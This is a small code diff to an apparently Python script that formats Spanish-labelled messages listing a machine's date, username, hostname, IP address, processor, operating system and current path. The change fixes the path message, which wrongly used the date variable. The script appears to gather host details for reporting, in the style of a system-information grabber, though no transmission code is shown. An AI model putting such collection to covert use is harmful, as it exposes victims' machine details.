@@ -18,7 +18,7 @@ message_ip = f'`[+] Dirección IP:` **{ip}**'
 message_processor_model = f'`[+] Modelo del procesador:` **{processor_model}**'
 message_processor_info = f'`[+] Información del procesador:` **{processor_info}**'
 message_system = f'`[+] Sistema operativo:` **{system}**'
-message_path = f'`[+] Ubicación actual:` **{date}**'
+message_path = f'`[+] Ubicación actual:` **{path}**'
 
 var_list = [message_date, message_username, message_hostname, message_ip, message_processor_model, message_processor_info, message_system, message_path]
 
